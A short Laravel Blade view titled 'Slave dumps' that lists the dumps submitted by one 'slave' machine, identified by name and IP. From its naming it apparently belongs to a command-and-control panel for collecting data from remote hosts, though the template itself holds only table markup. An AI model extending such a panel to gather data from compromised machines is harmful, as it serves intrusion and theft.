@extends("templates.command")
@section("content")
    <div class="row">
        <div class="col-md-12">
            <h2>Slave dumps</h2>
            <p><strong>Viewing</strong> {{ $slave->name }} - {{ $slave->ip }}</p>
            @if( $slave->dumps->count() == 0 )
                <div class="empty">This slave does not have any dumps yet</div>
            @else
                <table class="table table-bordered">
                    <thead>
                        <tr>
                            <th>#</th>
                            <th>Submission date</th>
                            <th class="text-right">Options</th>
                        </tr>
                    </thead>
                    <tbody>
                        @foreach($slave->dumps as $dump)
                            <tr>
                                <td>{{ $dump->id }}</td>
                                <td>{{ $dump->created_at }}</td>
                                <td class="text-right"><a href="#">View dump</a></td>
                            </tr>
                        @endforeach
                    </tbody>
                </table>
            @endif
        </div>
    </div>
@stop
